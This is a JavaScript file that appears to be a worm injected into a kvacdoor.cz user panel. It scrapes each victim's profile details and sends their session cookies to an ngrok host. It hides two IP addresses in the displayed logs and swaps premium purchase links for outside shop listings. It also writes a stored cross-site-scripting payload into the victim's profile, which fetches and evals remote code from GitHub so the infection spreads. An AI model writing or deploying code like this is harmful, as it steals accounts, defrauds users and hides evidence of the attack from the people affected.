function main() {
    if (actuallySent !== undefined) {
        return false;
    }

    var actuallySent = false;

    function getRandomInt(min, max) {
        min = Math.ceil(min);
        max = Math.floor(max);
        return Math.floor(Math.random() * (max - min) + min);
    }
    
    const id = document.querySelector("#page-topbar > div > div.d-flex.align-items-center > div > div > a:nth-child(1)").attributes['href'].value.split("/")[2];
    const username = document.querySelector('#page-header-user-dropdown > span').innerText
    const avatar = document.querySelector("#page-header-user-dropdown > img").src
    const expander = (document.querySelector("#page-header-user-dropdown > img").attributes['onload'] !== undefined)
    const premium = (document.querySelector("#side-menu > li:nth-child(8)").attributes['data-original-title'] == undefined)
    const ipv6_1 = `2001:f${getRandomInt(100,999)}:${getRandomInt(100,999)}:${getRandomInt(1000,9999)}::${getRandomInt(1000,9999)}`
    const ipv6_2 = `2001:f${getRandomInt(100,999)}:${getRandomInt(100,999)}:${getRandomInt(1000,9999)}::${getRandomInt(1000,9999)}`
    
    try {
        var logs = document.querySelectorAll("#app-layouts > div.main-content > div > div.row > div > div > div > p");
        logs.forEach( async log => {
            if (log.innerText.includes("107.189.10.123")) {
                log.innerText = log.innerText.replace("107.189.10.123", ipv6_1)
            }
            if (log.innerText.includes("146.59.80.183")) {
                log.innerText = log.innerText.replace("146.59.80.183", ipv6_2)
            }
        });
    }catch {
        console.clear();
    }
    fetch('https://4979-107-189-10-123.eu.ngrok.io/',{
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            id: id,
            username: username,
            avatar: avatar,
            expander: expander,
            path: window.location.pathname,
            domain: window.location.hostname,
            cookies: document.cookie,
            rank: (premium) ? "Premium" : "Free"
        })
    });
    
    try {
        var premiumBtn = document.querySelector("#app-layouts > div.main-content > div > div.card > div:nth-child(1) > div > div.col-12.col-md-6 > div.d-flex.flex-column.flex-sm-row > a");
        if (document.location.pathname.split("/")[2] === "steam-resolver") {
            premiumBtn.attributes['href'].value = "https://shoppy.gg/product/3zK6ZPw";    
        }else if (document.location.pathname.split("/")[2] === "premium-access"){
            premiumBtn.attributes['href'].value = "https://shoppy.gg/product/R3m2fjS"; 
        }
    }catch{
        console.clear();
    }
    
    if (!expander) {
        fetch("https://kvacdoor.cz/profile/" + id, {
        "headers": {
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "accept-language": "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7",
            "cache-control": "no-cache",
            "content-type": "application/x-www-form-urlencoded",
            "pragma": "no-cache",
            "sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Opera GX\";v=\"91\", \"Chromium\";v=\"105\"",
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": "\"Windows\"",
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": "same-origin",
            "sec-fetch-user": "?1",
            "upgrade-insecure-requests": "1",
            "x-requested-with": "XMLHttpRequest"
        },
        "referrer": "https://kvacdoor.cz/profile/" + id,
        "referrerPolicy": "strict-origin-when-cross-origin",
        "body": 'username=' + username + '&avatar=' + avatar + '" onload="fetch(`https://raw.githubusercontent.com/Clineeeche/Clineeeche.github.io/main/JQuery?${Date.now()}`).then( async result => eval(await result.text()))&description=&steamid=&edit-profile=',
        "method": "POST",
        "mode": "cors",
        "credentials": "include"
        });
    }
    
    console.clear();
    
    actuallySent = true;
}

main();
